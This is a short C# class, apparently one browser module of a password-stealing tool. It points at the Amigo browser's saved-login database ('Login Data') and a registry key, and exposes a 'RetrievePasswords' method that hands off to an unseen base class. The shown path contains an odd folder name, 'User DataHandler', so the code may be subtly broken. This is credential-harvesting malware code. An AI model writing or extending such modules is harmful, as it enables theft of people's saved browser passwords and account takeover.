namespace xoxoxo.Chromium
{
    internal sealed class AmigoChromium : ChromiumBase
    {
        public AmigoChromium()
        {
            SetValues();
        }

        private void SetValues()
        {
            ActualDataPath = LocData + "\\Amigo\\User DataHandler\\Default\\Login Data";
            RegistryPath = "SOFTWARE\\Amigo";
        }

        public void RetrievePasswords()
        {
            RetrieveData();
        }
    }
}